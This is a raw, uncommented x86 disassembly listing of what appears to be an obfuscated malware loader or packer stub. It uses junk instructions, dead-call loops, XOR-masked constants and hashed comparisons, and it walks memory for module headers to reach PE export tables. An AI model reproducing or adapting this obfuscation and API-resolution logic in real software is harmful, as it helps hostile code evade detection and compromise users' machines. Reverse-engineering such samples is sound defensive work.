  415040:	mov    edx,DWORD PTR [ebp-0xc]
  415043:	imul   ecx,DWORD PTR [edx]
  415046:	mov    DWORD PTR ds:0x4377a3,0x407a
  415050:	cmp    eax,ecx
  415052:	mov    DWORD PTR ds:0x437747,0x4754
  41505c:	je     0x415286
  415062:	sub    DWORD PTR ds:0x437773,ebx
  415068:	mov    eax,DWORD PTR [ebp-0x14]
  41506b:	inc    ecx
  41506c:	mov    DWORD PTR [ebp-0x4c],eax
  41506f:	mov    eax,DWORD PTR [ebp-0x4c]
  415072:	mov    ecx,DWORD PTR [ebp-0x18]
  415075:	sub    DWORD PTR ds:0x437757,0x437737
  41507f:	add    ecx,DWORD PTR [eax]
  415081:	and    DWORD PTR ds:0x43779f,0x0
  41508b:	xor    eax,eax
  41508d:	xor    eax,DWORD PTR ds:0x43779f
  415093:	inc    eax
  415094:	mov    ds:0x43779f,eax
  415099:	cmp    DWORD PTR ds:0x43779f,0x6
  4150a0:	jl     0x4150e8
  4150a6:	jmp    0x4150c3
  4150ab:	push   0x43772b
  4150b0:	push   0x765e
  4150b5:	push   DWORD PTR [ebp-0x24]
  4150b8:	push   0x1ae5
  4150bd:	call   DWORD PTR ds:0x43c9e4
  4150c3:	cmp    DWORD PTR ds:0x43779f,0x5
  4150ca:	jne    0x4150db
  4150d0:	mov    eax,ds:0x43779f
  4150d5:	inc    eax
  4150d6:	mov    ds:0x43779f,eax
  4150db:	cmp    DWORD PTR ds:0x43779f,0x1c
  4150e2:	jb     0x41508b
  4150e8:	mov    eax,DWORD PTR [ebp-0x4c]
  4150eb:	add    DWORD PTR ds:0x437767,0x43771f
  4150f5:	mov    DWORD PTR [eax],ecx
  4150f7:	adc    DWORD PTR ds:0x43771f,0x57c4
  415101:	mov    eax,DWORD PTR [ebp-0x14]
  415104:	mov    DWORD PTR [ebp-0x50],eax
  415107:	and    DWORD PTR ds:0x43774b,0x0
  415111:	mov    ecx,DWORD PTR ds:0x43774b
  415117:	inc    ecx
  415118:	mov    DWORD PTR ds:0x43774b,ecx
  41511e:	cmp    DWORD PTR ds:0x43774b,0x4
  415125:	jbe    0x415167
  41512b:	jmp    0x415140
  415130:	push   0x437773
  415135:	push   0x69a7
  41513a:	call   DWORD PTR ds:0x43c9e8
  415140:	cmp    DWORD PTR ds:0x43774b,0x3
  415147:	jne    0x41515a
  41514d:	mov    ecx,DWORD PTR ds:0x43774b
  415153:	inc    ecx
  415154:	mov    DWORD PTR ds:0x43774b,ecx
  41515a:	cmp    DWORD PTR ds:0x43774b,0x16
  415161:	jb     0x415111
  415167:	mov    eax,DWORD PTR [ebp+0xc]
  41516a:	xor    eax,0x75108b5
  41516f:	add    eax,0x3272fb
  415174:	and    DWORD PTR ds:0x43774b,0x0
  41517e:	mov    ecx,DWORD PTR ds:0x43774b
  415184:	inc    ecx
  415185:	mov    DWORD PTR ds:0x43774b,ecx
  41518b:	cmp    DWORD PTR ds:0x43774b,0x6
  415192:	jbe    0x4151ec
  415198:	jmp    0x4151c5
  41519d:	push   0x69fb
  4151a2:	push   DWORD PTR [ebp-0x14]
  4151a5:	push   0x4075
  4151aa:	push   0x1f01
  4151af:	push   DWORD PTR [ebp-0x1c]
  4151b2:	push   0x802b
  4151b7:	push   DWORD PTR [ebp-0x28]
  4151ba:	push   0x43700d
  4151bf:	call   DWORD PTR ds:0x43c9ec
  4151c5:	cmp    DWORD PTR ds:0x43774b,0x5
  4151cc:	jne    0x4151df
  4151d2:	mov    ecx,DWORD PTR ds:0x43774b
  4151d8:	inc    ecx
  4151d9:	mov    DWORD PTR ds:0x43774b,ecx
  4151df:	cmp    DWORD PTR ds:0x43774b,0x11
  4151e6:	jb     0x41517e
  4151ec:	mov    ecx,DWORD PTR [ebp-0x50]
  4151ef:	imul   eax,DWORD PTR [ecx]
  4151f2:	sbb    ecx,0xf91
  4151f8:	mov    ecx,DWORD PTR [ebp-0x50]
  4151fb:	mov    DWORD PTR ds:0x437747,0x499d
  415205:	mov    DWORD PTR [ecx],eax
  415207:	mov    eax,DWORD PTR [ebp-0x14]
  41520a:	mov    DWORD PTR ds:0x437777,0x1a
  415214:	cmp    DWORD PTR ds:0x437777,0x0
  41521b:	je     0x415265
  415221:	cmp    DWORD PTR ds:0x437777,0x21
  415228:	jbe    0x415265
  41522e:	jmp    0x415253
  415233:	push   0x3847
  415238:	push   0x437787
  41523d:	push   DWORD PTR [ebp-0x28]
  415240:	push   DWORD PTR [ebp-0x10]
  415243:	push   0x4f57
  415248:	push   0x7258
  41524d:	call   DWORD PTR ds:0x43c9f0
  415253:	mov    ecx,DWORD PTR ds:0x437777
  415259:	dec    ecx
  41525a:	mov    DWORD PTR ds:0x437777,ecx
  415260:	jmp    0x415214
  415265:	mov    DWORD PTR [ebp-0x54],eax
  415268:	mov    eax,DWORD PTR [ebp+0x10]
  41526b:	xor    eax,0x75108b5
  415270:	add    eax,0x3272fb
  415275:	mov    ecx,DWORD PTR [ebp-0x54]
  415278:	mov    ecx,DWORD PTR [ecx]
  41527a:	sub    ecx,eax
  41527c:	mov    eax,DWORD PTR [ebp-0x54]
  41527f:	mov    DWORD PTR [eax],ecx
  415281:	jmp    0x4152b8
  415286:	mov    eax,DWORD PTR [ebp-0x14]
  415289:	mov    DWORD PTR [ebp-0x58],eax
  41528c:	mov    eax,DWORD PTR [ebp+0x14]
  41528f:	mov    ecx,DWORD PTR [ebp-0x58]
  415292:	xor    eax,DWORD PTR [ecx]
  415294:	mov    ecx,DWORD PTR [ebp-0x58]
  415297:	mov    DWORD PTR [ecx],eax
  415299:	mov    eax,DWORD PTR [ebp-0x14]
  41529c:	mov    DWORD PTR [ebp-0x5c],eax
  41529f:	mov    eax,DWORD PTR [ebp+0x10]
  4152a2:	xor    eax,0x75108b5
  4152a7:	add    eax,0x3272fb
  4152ac:	mov    ecx,DWORD PTR [ebp-0x5c]
  4152af:	mov    ecx,DWORD PTR [ecx]
  4152b1:	sub    ecx,eax
  4152b3:	mov    eax,DWORD PTR [ebp-0x5c]
  4152b6:	mov    DWORD PTR [eax],ecx
  4152b8:	mov    eax,DWORD PTR [ebp-0x14]
  4152bb:	mov    ecx,DWORD PTR [ebp-0xc]
  4152be:	add    ecx,DWORD PTR [eax]
  4152c0:	mov    DWORD PTR [ebp-0xc],ecx
  4152c3:	mov    eax,DWORD PTR [ebp+0xc]
  4152c6:	xor    eax,0x75108b5
  4152cb:	add    eax,0x3272fb
  4152d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4152d3:	xor    ecx,0x75108b5
  4152d9:	mov    edx,DWORD PTR [ebp+0xc]
  4152dc:	xor    edx,0x75108b5
  4152e2:	lea    ecx,[ecx+edx*1+0x64e5f6]
  4152e9:	mov    edx,DWORD PTR [ebp+0xc]
  4152ec:	xor    edx,0x75108b5
  4152f2:	add    edx,0x3272fb
  4152f8:	imul   ecx,edx
  4152fb:	sub    eax,ecx
  4152fd:	mov    ecx,DWORD PTR [ebp-0x14]
  415300:	cmp    DWORD PTR [ecx],eax
  415302:	jg     0x41532c
  415308:	mov    eax,DWORD PTR [ebp-0x14]
  41530b:	mov    DWORD PTR [ebp-0x60],eax
  41530e:	mov    eax,DWORD PTR [ebp+0x10]
  415311:	xor    eax,0x75108b5
  415316:	add    eax,0x3272fb
  41531b:	mov    ecx,DWORD PTR [ebp-0x60]
  41531e:	mov    ecx,DWORD PTR [ecx]
  415320:	sub    ecx,eax
  415322:	mov    eax,DWORD PTR [ebp-0x60]
  415325:	mov    DWORD PTR [eax],ecx
  415327:	jmp    0x41534b
  41532c:	mov    eax,DWORD PTR [ebp-0x14]
  41532f:	mov    DWORD PTR [ebp-0x64],eax
  415332:	mov    eax,DWORD PTR [ebp+0x10]
  415335:	xor    eax,0x75108b5
  41533a:	mov    ecx,DWORD PTR [ebp-0x64]
  41533d:	mov    ecx,DWORD PTR [ecx]
  41533f:	lea    eax,[eax+ecx*1+0x3272fb]
  415346:	mov    ecx,DWORD PTR [ebp-0x64]
  415349:	mov    DWORD PTR [ecx],eax
  41534b:	mov    eax,DWORD PTR [ebp-0xc]
  41534e:	mov    eax,DWORD PTR [eax]
  415350:	mov    DWORD PTR [ebp-0x2c],eax
  415353:	mov    eax,DWORD PTR [ebp-0x8]
  415356:	xor    eax,0x75108b5
  41535b:	add    eax,0x3272fa
  415360:	not    eax
  415362:	and    eax,DWORD PTR [ebp-0x2c]
  415365:	mov    DWORD PTR [ebp-0x2c],eax
  415368:	lea    eax,[ebp-0x20]
  41536b:	mov    DWORD PTR [ebp-0x38],eax
  41536e:	mov    eax,DWORD PTR [ebp-0x38]
  415371:	mov    DWORD PTR [eax],0x7097b85d
  415377:	mov    DWORD PTR [eax+0x4],0xffffffff
  41537e:	lea    eax,[ebp-0x28]
  415381:	mov    DWORD PTR [ebp-0x30],eax
  415384:	mov    eax,DWORD PTR [ebp-0x30]
  415387:	mov    DWORD PTR [eax],0x7097a55f
  41538d:	mov    DWORD PTR [eax+0x4],0xffffffff
  415394:	mov    eax,DWORD PTR [ebp-0x2c]
  415397:	movzx  eax,WORD PTR [eax]
  41539a:	mov    ecx,DWORD PTR [ebp-0x20]
  41539d:	mov    edx,DWORD PTR [ebp-0x1c]
  4153a0:	xor    ecx,0x8a29a14b
  4153a6:	xor    edx,0x0
  4153a9:	add    ecx,0x5424137
  4153af:	adc    edx,0x0
  4153b2:	movzx  ecx,cx
  4153b5:	cmp    eax,ecx
  4153b7:	je     0x4153dc
  4153bd:	mov    eax,DWORD PTR [ebp-0x8]
  4153c0:	xor    eax,0x75108b5
  4153c5:	add    eax,0x3272fb
  4153ca:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153cd:	sub    ecx,eax
  4153cf:	mov    DWORD PTR [ebp-0x2c],ecx
  4153d2:	jmp    0x415368
  4153d7:	jmp    0x41548c
  4153dc:	lea    eax,[ebp-0x44]
  4153df:	mov    DWORD PTR [ebp-0x40],eax
  4153e2:	mov    eax,DWORD PTR [ebp-0x2c]
  4153e5:	mov    ecx,DWORD PTR [ebp-0x2c]
  4153e8:	add    ecx,DWORD PTR [eax+0x3c]
  4153eb:	mov    eax,DWORD PTR [ebp-0x10]
  4153ee:	mov    eax,DWORD PTR [eax]
  4153f0:	mov    edx,DWORD PTR [ebp-0x40]
  4153f3:	mov    eax,DWORD PTR [ecx+eax*8+0x78]
  4153f7:	mov    DWORD PTR [edx],eax
  4153f9:	lea    eax,[ebp-0x3c]
  4153fc:	mov    DWORD PTR [ebp-0x48],eax
  4153ff:	mov    eax,DWORD PTR [ebp+0x8]
  415402:	xor    eax,0x75108b5
  415407:	add    eax,0x3272fb
  41540c:	mov    ecx,DWORD PTR [ebp-0x48]
  41540f:	mov    DWORD PTR [ecx],eax
  415411:	mov    eax,DWORD PTR [ebp-0x44]
  415414:	mov    ecx,DWORD PTR [ebp+0x8]
  415417:	xor    ecx,0x75108b5
  41541d:	add    ecx,0x3272fb
  415423:	cmp    eax,ecx
  415425:	je     0x41547b
  41542b:	mov    eax,DWORD PTR [ebp-0x2c]
  41542e:	add    eax,DWORD PTR [ebp-0x44]
  415431:	mov    ecx,DWORD PTR [ebp-0x48]
  415434:	mov    DWORD PTR [ecx],eax
  415436:	mov    eax,DWORD PTR [ebp-0x3c]
  415439:	mov    eax,DWORD PTR [eax+0xc]
  41543c:	mov    ecx,DWORD PTR [ebp-0x2c]
  41543f:	movzx  eax,WORD PTR [ecx+eax*1]
  415443:	mov    ecx,DWORD PTR [ebp-0x28]
  415446:	mov    edx,DWORD PTR [ebp-0x24]
  415449:	xor    ecx,0x8a29a14b
  41544f:	xor    edx,0x0
  415452:	add    ecx,0x5424137
  415458:	adc    edx,0x0
  41545b:	movzx  ecx,cx
  41545e:	cmp    eax,ecx
  415460:	jne    0x41547b
  415466:	mov    eax,ds:0x43739f
  41546b:	mov    eax,DWORD PTR [eax+0x198]
  415471:	mov    ecx,DWORD PTR [ebp-0x2c]
  415474:	mov    DWORD PTR [eax],ecx
  415476:	jmp    0x41548c
  41547b:	push   DWORD PTR [ebp+0x14]
  41547e:	push   DWORD PTR [ebp+0x10]
  415481:	push   DWORD PTR [ebp+0xc]
  415484:	push   DWORD PTR [ebp+0x8]
  415487:	call   0x414de4
  41548c:	leave  
  41548d:	ret    0x10
  415490:	push   ebp
  415491:	mov    ebp,esp
  415493:	push   ecx
  415494:	or     DWORD PTR ds:0x437737,0x437717
  41549e:	push   ecx
  41549f:	sub    DWORD PTR ds:0x437757,ebx
  4154a5:	lea    eax,[ebp-0x8]
  4154a8:	adc    ecx,DWORD PTR ds:0x43778b
  4154ae:	mov    DWORD PTR [ebp-0x4],eax
  4154b1:	mov    eax,ds:0x43775b
  4154b6:	xor    DWORD PTR ds:0x43777f,eax
  4154bc:	mov    eax,DWORD PTR [ebp-0x8]
  4154bf:	and    ecx,DWORD PTR ds:0x43776f
  4154c5:	mov    ecx,DWORD PTR [ebp-0x4]
  4154c8:	mov    ecx,DWORD PTR [ecx]
  4154ca:	sub    eax,ecx
  4154cc:	mov    DWORD PTR [ebp-0x8],eax
  4154cf:	or     DWORD PTR ds:0x437733,0x437787
  4154d9:	xor    eax,eax
  4154db:	and    DWORD PTR ds:0x437747,0x0
  4154e5:	xor    ecx,ecx
  4154e7:	or     ecx,DWORD PTR ds:0x437747
  4154ed:	inc    ecx
  4154ee:	mov    DWORD PTR ds:0x437747,ecx
  4154f4:	cmp    DWORD PTR ds:0x437747,0x1d
  4154fb:	jbe    0x41552d
  415501:	jmp    0x415520
  415506:	push   0x43772f
  41550b:	push   0x43773f
  415510:	push   0x7558
  415515:	push   0x4370a4
  41551a:	call   DWORD PTR ds:0x43c9f4
  415520:	cmp    DWORD PTR ds:0x437747,0x1c
  415527:	jb     0x4154e5
  41552d:	mov    eax,DWORD PTR [ebp-0x4]
  415530:	not    DWORD PTR ds:0x43778f
  415536:	mov    eax,DWORD PTR [eax]
  415538:	and    DWORD PTR ds:0x437767,0x0
  415542:	mov    ecx,DWORD PTR ds:0x437767
  415548:	inc    ecx
  415549:	mov    DWORD PTR ds:0x437767,ecx
  41554f:	cmp    DWORD PTR ds:0x437767,0x7
  415556:	jb     0x41559b
  41555c:	jmp    0x415574
  415561:	push   0x437767
  415566:	push   0x437733
  41556b:	push   DWORD PTR [ebp-0x28]
  41556e:	call   DWORD PTR ds:0x43c9f8
  415574:	cmp    DWORD PTR ds:0x437767,0x6
  41557b:	jne    0x41558e
  415581:	mov    ecx,DWORD PTR ds:0x437767
  415587:	inc    ecx
  415588:	mov    DWORD PTR ds:0x437767,ecx
  41558e:	cmp    DWORD PTR ds:0x437767,0x12
  415595:	jb     0x415542
  41559b:	xor    eax,0xf89c85bc
  4155a0:	mov    ecx,DWORD PTR [ebp-0x4]
  4155a3:	mov    DWORD PTR [ecx],eax
  4155a5:	mov    eax,DWORD PTR [ebp+0xc]
  4155a8:	xor    eax,0x75108b5
  4155ad:	add    eax,0x3272fb
  4155b2:	mov    ecx,DWORD PTR [ebp+0x10]
  4155b5:	mov    DWORD PTR [ecx+0x4],eax
  4155b8:	mov    eax,DWORD PTR [ebp+0x14]
  4155bb:	mov    ecx,DWORD PTR [ebp+0x10]
  4155be:	mov    DWORD PTR [ecx+0x8],eax
  4155c1:	mov    eax,DWORD PTR [ebp+0x18]
  4155c4:	mov    ecx,DWORD PTR [ebp+0x10]
  4155c7:	mov    DWORD PTR [ecx+0xc],eax
  4155ca:	mov    eax,DWORD PTR [ebp+0x1c]
  4155cd:	mov    ecx,DWORD PTR [ebp+0x10]
  4155d0:	mov    DWORD PTR [ecx+0x10],eax
  4155d3:	mov    eax,DWORD PTR [ebp-0x8]
  4155d6:	xor    eax,0x75108b5
  4155db:	add    eax,0x3272fb
  4155e0:	mov    ecx,DWORD PTR [ebp+0x10]
  4155e3:	mov    DWORD PTR [ecx],eax
  4155e5:	mov    eax,DWORD PTR [ebp+0x8]
  4155e8:	xor    eax,0x75108b5
  4155ed:	add    eax,0x3272fb
  4155f2:	leave  
  4155f3:	ret    0x18
  4155f6:	push   ebp
  4155f7:	mov    ebp,esp
  4155f9:	sub    esp,0x1ac
  4155ff:	add    eax,DWORD PTR ds:0x4377a7
  415605:	push   esi
  415606:	add    DWORD PTR ds:0x43771b,0x43779b
  415610:	mov    eax,DWORD PTR [ebp+0x8]
  415613:	xor    eax,0x75108b5
  415618:	add    eax,0x3272fb
  41561d:	xor    DWORD PTR ds:0x43777f,0x43779f
  415627:	mov    DWORD PTR [ebp-0x20],eax
  41562a:	movzx  eax,BYTE PTR ds:0x437797
  415631:	adc    eax,DWORD PTR ds:0x4377a3
  415637:	mov    ds:0x437797,eax
  41563c:	mov    eax,ds:0x43721f
  415641:	mov    eax,DWORD PTR [eax]
  415643:	xor    DWORD PTR ds:0x437787,0xb5b
  41564d:	mov    DWORD PTR [ebp-0x10],eax
  415650:	movzx  eax,BYTE PTR ds:0x4377a7
  415657:	and    eax,DWORD PTR ds:0x437793
  41565d:	mov    ds:0x4377a7,eax
  415662:	mov    eax,ds:0x43742f
  415667:	mov    eax,DWORD PTR [eax]
  415669:	mov    DWORD PTR [ebp-0x14],eax
  41566c:	inc    eax
  41566d:	mov    eax,DWORD PTR [ebp-0x10]
  415670:	and    DWORD PTR ds:0x4377a3,0x4377b3
  41567a:	xor    ecx,ecx
  41567c:	sub    eax,0x5424137
  415681:	mov    DWORD PTR ds:0x43779b,0x4f0f
  41568b:	sbb    ecx,0x0
  41568e:	xor    eax,0x8a29a14b
  415693:	sub    DWORD PTR ds:0x43772f,0x7a71
  41569d:	xor    ecx,0x0
  4156a0:	mov    DWORD PTR [ebp-0x1a4],eax
  4156a6:	mov    DWORD PTR ds:0x43777b,0x4c82
  4156b0:	mov    DWORD PTR [ebp-0x1a0],ecx
  4156b6:	mov    DWORD PTR ds:0x437793,0x4615
  4156c0:	cmp    DWORD PTR [ebp-0x1a4],0x70941f82
  4156ca:	jne    0x4156f1
  4156d0:	mov    DWORD PTR ds:0x43776f,0x15aa
  4156da:	cmp    DWORD PTR [ebp-0x1a0],0xffffffff
  4156e1:	mov    DWORD PTR ds:0x437733,0x56fb
  4156eb:	je     0x415a9e
  4156f1:	and    DWORD PTR ds:0x437767,0x0
  4156fb:	jmp    0x41570b
  415700:	mov    eax,ds:0x437767
  415705:	inc    eax
  415706:	mov    ds:0x437767,eax
  41570b:	cmp    DWORD PTR ds:0x437767,0x14
  415712:	jae    0x415748
  415718:	cmp    DWORD PTR ds:0x437767,0x1f
  41571f:	jge    0x415748
  415725:	jmp    0x415743
  41572a:	push   0x3245
  41572f:	push   DWORD PTR [ebp-0xc]
  415732:	push   DWORD PTR [ebp-0x20]
  415735:	push   0x2d62
  41573a:	push   DWORD PTR [ebp-0x1c]
  41573d:	call   DWORD PTR ds:0x43c9fc
  415743:	jmp    0x415700
  415748:	mov    eax,DWORD PTR [ebp-0x14]
  41574b:	sub    DWORD PTR ds:0x437753,0x4f0
  415755:	xor    ecx,ecx
  415757:	xor    DWORD PTR ds:0x437777,0x1d12
  415761:	sub    eax,0x5424137
  415766:	mov    DWORD PTR ds:0x437777,0x6f96
  415770:	sbb    ecx,0x0
  415773:	xor    eax,0x8a29a14b
  415778:	xor    ecx,0x0
  41577b:	mov    DWORD PTR [ebp-0x1ac],eax
  415781:	mov    DWORD PTR ds:0x43775b,0x49f3
  41578b:	mov    DWORD PTR [ebp-0x1a8],ecx
  415791:	cmp    DWORD PTR [ebp-0x1ac],0x70941f82
  41579b:	mov    DWORD PTR ds:0x437773,0xfeb
  4157a5:	jne    0x4157c2
  4157ab:	mov    DWORD PTR ds:0x43773f,0x71a9
  4157b5:	cmp    DWORD PTR [ebp-0x1a8],0xffffffff
  4157bc:	je     0x415a9e
  4157c2:	dec    eax
  4157c3:	mov    eax,DWORD PTR [ebp+0x10]
  4157c6:	xor    ecx,ecx
  4157c8:	or     ecx,DWORD PTR ds:0x43776b
  4157ce:	sbb    ecx,DWORD PTR ds:0x43772f
  4157d4:	mov    DWORD PTR ds:0x43776b,ecx
  4157da:	xor    eax,0x75108b5
  4157df:	xor    ecx,ecx
  4157e1:	or     ecx,DWORD PTR ds:0x4384a7
  4157e7:	mov    ecx,DWORD PTR [ecx]
  4157e9:	and    DWORD PTR ds:0x43772f,ecx
  4157ef:	add    eax,0x3272fb
  4157f4:	xor    ecx,DWORD PTR ds:0x43779f
  4157fa:	mov    DWORD PTR [ebp-0x1c],eax
  4157fd:	mov    DWORD PTR ds:0x437727,0x14
  415807:	cmp    DWORD PTR ds:0x437727,0x0
  41580e:	je     0x415862
  415814:	cmp    DWORD PTR ds:0x437727,0x5
  41581b:	ja     0x415862
  415821:	jmp    0x41583a
  415826:	push   DWORD PTR [ebp-0x28]
  415829:	push   DWORD PTR [ebp-0x14]
  41582c:	push   0x4370f4
  415831:	push   DWORD PTR [ebp-0x18]
  415834:	call   DWORD PTR ds:0x43ca00
  41583a:	cmp    DWORD PTR ds:0x437727,0x6
  415841:	jne    0x415852
  415847:	mov    eax,ds:0x437727
  41584c:	dec    eax
  41584d:	mov    ds:0x437727,eax
  415852:	mov    eax,ds:0x437727
  415857:	dec    eax
  415858:	mov    ds:0x437727,eax
  41585d:	jmp    0x415807
  415862:	mov    eax,ds:0x43739f
  415867:	mov    DWORD PTR [ebp-0x18],eax
  41586a:	movzx  ecx,BYTE PTR ds:0x43770f
  415871:	xor    DWORD PTR ds:0x43775b,ecx
  415877:	mov    eax,DWORD PTR [ebp-0x10]
  41587a:	and    DWORD PTR ds:0x4377b3,0x0
  415884:	jmp    0x415896
  415889:	mov    ecx,DWORD PTR ds:0x4377b3
  41588f:	inc    ecx
  415890:	mov    DWORD PTR ds:0x4377b3,ecx
  415896:	cmp    DWORD PTR ds:0x4377b3,0x1b
  41589d:	jae    0x4158c5
  4158a3:	cmp    DWORD PTR ds:0x4377b3,0x21
  4158aa:	jb     0x4158c5
  4158b0:	jmp    0x4158c0
  4158b5:	push   0x6097
  4158ba:	call   DWORD PTR ds:0x43ca04
  4158c0:	jmp    0x415889
  4158c5:	mov    DWORD PTR [ebp-0x24],eax
  4158c8:	mov    eax,DWORD PTR [ebp-0x14]
  4158cb:	add    eax,0x4
  4158ce:	mov    ecx,DWORD PTR [ebp-0x24]
  4158d1:	sub    DWORD PTR ds:0x43771f,0x631a
  4158db:	sub    eax,ecx
  4158dd:	mov    DWORD PTR [ebp-0x4],eax
  4158e0:	xor    eax,0x956
  4158e5:	mov    DWORD PTR [ebp-0x78],0xf89c85bc
  4158ec:	xor    eax,DWORD PTR ds:0x43775f
  4158f2:	mov    eax,DWORD PTR [ebp-0x24]
  4158f5:	mov    DWORD PTR [ebp-0x74],eax
  4158f8:	mov    DWORD PTR ds:0x437723,0x1a
  415902:	cmp    DWORD PTR ds:0x437723,0x0
  415909:	je     0x415955
  41590f:	cmp    DWORD PTR ds:0x437723,0xa
  415916:	jle    0x415955
  41591c:	jmp    0x41592d
  415921:	push   DWORD PTR [ebp-0x1c]
  415924:	push   DWORD PTR [ebp-0x1c]
  415927:	call   DWORD PTR ds:0x43ca08
  41592d:	cmp    DWORD PTR ds:0x437723,0xb
  415934:	jne    0x415945
  41593a:	mov    eax,ds:0x437723
  41593f:	dec    eax
  415940:	mov    ds:0x437723,eax
  415945:	mov    eax,ds:0x437723
  41594a:	dec    eax
  41594b:	mov    ds:0x437723,eax
  415950:	jmp    0x415902
  415955:	mov    eax,DWORD PTR [ebp-0x4]
  415958:	or     DWORD PTR ds:0x43774f,0x437717
  415962:	mov    DWORD PTR [ebp-0x70],eax
  415965:	xor    DWORD PTR ds:0x43771f,ebx
  41596b:	mov    eax,DWORD PTR [ebp+0x14]
  41596e:	xor    DWORD PTR ds:0x437713,0x4377af
  415978:	xor    eax,0x75108b5
  41597d:	xor    DWORD PTR ds:0x43770f,0x6763
  415987:	add    eax,0x3272fb
  41598c:	add    DWORD PTR ds:0x4377bb,0x6c9b
  415996:	mov    DWORD PTR [ebp-0x6c],eax
  415999:	sub    DWORD PTR ds:0x437723,0x4377af
  4159a3:	lea    eax,[ebp-0xc]
  4159a6:	not    DWORD PTR ds:0x43777b
  4159ac:	mov    DWORD PTR [ebp-0x68],eax
  4159af:	neg    DWORD PTR ds:0x43772f
  4159b5:	mov    eax,DWORD PTR [ebp-0x78]
  4159b8:	xor    DWORD PTR ds:0x437787,0x23e8
  4159c2:	xor    eax,0x75108b5
  4159c7:	sub    DWORD PTR ds:0x4377b3,0x919
  4159d1:	add    eax,0x3272fb
  4159d6:	mov    DWORD PTR [ebp-0x78],eax
  4159d9:	adc    DWORD PTR ds:0x4377af,0x561d
  4159e3:	lea    eax,[ebp-0x78]
  4159e6:	sub    DWORD PTR ds:0x43776b,0x437783
  4159f0:	push   eax
  4159f1:	mov    eax,ds:0x437787
  4159f6:	adc    DWORD PTR ds:0x43774f,eax
  4159fc:	mov    eax,DWORD PTR [ebp+0xc]
  4159ff:	or     DWORD PTR ds:0x4377a7,0x409b
  415a09:	xor    eax,0x75108b5
  415a0e:	or     DWORD PTR ds:0x437763,0x48d4
  415a18:	add    eax,0x3272fb
  415a1d:	xor    DWORD PTR ds:0x437737,0x4377bb
  415a27:	push   eax
  415a28:	mov    DWORD PTR ds:0x43770f,0x1d
  415a32:	cmp    DWORD PTR ds:0x43770f,0x0
  415a39:	je     0x415a79
  415a3f:	cmp    DWORD PTR ds:0x43770f,0x22
  415a46:	jle    0x415a79
  415a4c:	jmp    0x415a69
  415a51:	push   0x5a7a
  415a56:	push   DWORD PTR [ebp-0xc]
  415a59:	push   0x437773
  415a5e:	push   0x43774b
  415a63:	call   DWORD PTR ds:0x43ca0c
  415a69:	mov    eax,ds:0x43770f
  415a6e:	dec    eax
  415a6f:	mov    ds:0x43770f,eax
  415a74:	jmp    0x415a32
  415a79:	push   0x437315
  415a7e:	mov    eax,ds:0x4373bf
  415a83:	adc    DWORD PTR ds:0x43779f,0x43778f
  415a8d:	push   DWORD PTR [eax]
  415a8f:	sbb    DWORD PTR ds:0x43771b,0x437783
  415a99:	call   0x40d347
  415a9e:	mov    eax,DWORD PTR [ebp-0x24]
  415aa1:	or     DWORD PTR ds:0x43776f,0x10e2
  415aab:	mov    DWORD PTR [ebp-0x8],eax
  415aae:	mov    eax,DWORD PTR [ebp-0x4]
  415ab1:	add    DWORD PTR ds:0x437753,0x43776f
  415abb:	mov    DWORD PTR [ebp-0x2c],eax
  415abe:	sub    DWORD PTR ds:0x43776f,ebx
  415ac4:	mov    eax,DWORD PTR [ebp-0x8]
  415ac7:	sub    eax,0x3272fb
  415acc:	xor    eax,0x75108b5
  415ad1:	cmp    eax,0xf89c85b0
  415ad6:	jne    0x415ae9
  415adc:	dec    DWORD PTR ds:0x4377af
  415ae2:	xor    eax,eax
  415ae4:	jmp    0x42d445
  415ae9:	xor    eax,eax
  415aeb:	add    eax,DWORD PTR ds:0x43774f
  415af1:	and    DWORD PTR ds:0x43775f,eax
  415af7:	mov    eax,DWORD PTR [ebp-0x2c]
  415afa:	and    DWORD PTR ds:0x437717,0x0
  415b04:	jmp    0x415b16
  415b09:	mov    ecx,DWORD PTR ds:0x437717
  415b0f:	inc    ecx
  415b10:	mov    DWORD PTR ds:0x437717,ecx
  415b16:	cmp    DWORD PTR ds:0x437717,0x10
  415b1d:	jae    0x415b70
  415b23:	cmp    DWORD PTR ds:0x437717,0x6
  415b2a:	jle    0x415b70
  415b30:	jmp    0x415b51
  415b35:	push   DWORD PTR [ebp-0xc]
  415b38:	push   0x437042
  415b3d:	push   DWORD PTR [ebp-0x14]
  415b40:	push   0x4370f4
  415b45:	push   DWORD PTR [ebp-0x20]
  415b48:	push   DWORD PTR [ebp-0x20]
  415b4b:	call   DWORD PTR ds:0x43ca10
  415b51:	cmp    DWORD PTR ds:0x437717,0x5
  415b58:	jne    0x415b6b
  415b5e:	mov    ecx,DWORD PTR ds:0x437717
  415b64:	inc    ecx
  415b65:	mov    DWORD PTR ds:0x437717,ecx
  415b6b:	jmp    0x415b09
  415b70:	mov    DWORD PTR [ebp-0xc4],eax
  415b76:	mov    DWORD PTR [ebp-0x98],0xf89c8527
  415b80:	mov    DWORD PTR [ebp-0x90],0xf89c85bd
  415b8a:	and    DWORD PTR ds:0x43777b,0x0
  415b94:	jmp    0x415ba6
  415b99:	mov    ecx,DWORD PTR ds:0x43777b
  415b9f:	inc    ecx
  415ba0:	mov    DWORD PTR ds:0x43777b,ecx
  415ba6:	cmp    DWORD PTR ds:0x43777b,0x18
  415bad:	jae    0x415bda
  415bb3:	cmp    DWORD PTR ds:0x43777b,0x20
  415bba:	jb     0x415bda
  415bc0:	jmp    0x415bd5
  415bc5:	push   0x4b28
  415bca:	push   0x437737
  415bcf:	call   DWORD PTR ds:0x43c960
  415bd5:	jmp    0x415b99
  415bda:	mov    DWORD PTR [ebp-0xa0],0xf89c85b0
  415be4:	mov    DWORD PTR [ebp-0xa4],0xf89c85b3
  415bee:	mov    DWORD PTR [ebp-0x8c],0xf89c85b2
  415bf8:	or     DWORD PTR ds:0x43773f,edi
  415bfe:	mov    eax,DWORD PTR [ebp-0xa4]
  415c04:	mov    ecx,DWORD PTR ds:0x4377d3
  415c0a:	mov    ecx,DWORD PTR [ecx]
  415c0c:	sbb    DWORD PTR ds:0x437767,ecx
  415c12:	xor    eax,0x75108b5
  415c17:	add    DWORD PTR ds:0x4377a7,0x2ea0
  415c21:	add    eax,0x3272fb
  415c26:	mov    ecx,DWORD PTR ds:0x43779f
  415c2c:	sub    DWORD PTR ds:0x437743,ecx
  415c32:	mov    ecx,DWORD PTR [ebp-0xc4]
  415c38:	sub    ecx,eax
  415c3a:	mov    DWORD PTR ds:0x437767,0x6669
  415c44:	mov    DWORD PTR [ebp-0x94],ecx
